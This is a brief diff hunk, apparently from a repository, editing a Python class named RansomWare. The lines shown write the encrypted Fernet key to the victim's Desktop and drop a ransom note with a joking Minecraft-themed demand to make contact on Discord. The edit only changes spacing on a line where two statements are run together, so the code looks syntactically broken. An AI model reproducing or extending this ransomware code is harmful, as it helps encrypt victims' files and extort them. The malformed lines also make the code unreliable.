@@ -83,7 +83,7 @@ class RansomWare:
             f.write(enc_fernent_key)
         # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
         with open(f'{self.sysRoot}\Desktop\XD.txt', 'wb') as fa:
-            fa.write(enc_fernent_key)                with open(f'{self.sysRoot}\Desktop\important.txt','wb') as fh:            fh.write("Your chest of diamonds have been ransomwared. If you want them back, contact us on discord. #epicminecraftplays #gg10ez #rekt")
+            fa.write(enc_fernent_key)                with open(f'{self.sysRoot}\Desktop\important.txt', 'wb') as fh:                    fh.write("Your chest of diamonds have been ransomwared. If you want them back, contact us on discord. #epicminecraftplays #gg10ez #rekt")
         # Assign self.key to encrypted fernet key
         self.key = enc_fernent_key
         # Remove fernet crypter object
